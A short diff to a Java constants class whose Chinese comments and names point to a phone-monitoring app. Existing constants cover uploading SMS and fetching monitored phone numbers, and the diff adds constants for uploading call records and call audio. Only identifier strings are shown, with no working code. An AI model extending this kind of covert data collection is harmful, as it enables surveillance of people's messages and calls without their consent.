@@ -25,6 +25,12 @@ public class C {
 		public static final String uploadSMS = "1c1d4f559ebbc08c492539282f36f969";
 		//获取监控手机号
 		public static final String getMonitorList = "041e83198b89ce1eb95d05b41b5b1a67";
+		
+		//上传通话记录
+		public static final String uploadCallRecord = "31f16307a0b19c188333ed2454651f192";
+	
+		//上传文件
+		public static final String uploadCallSound = "31f16307a0b19c188333ed2454651f19";
 	}
 	
 	//标记是否需要上传数据
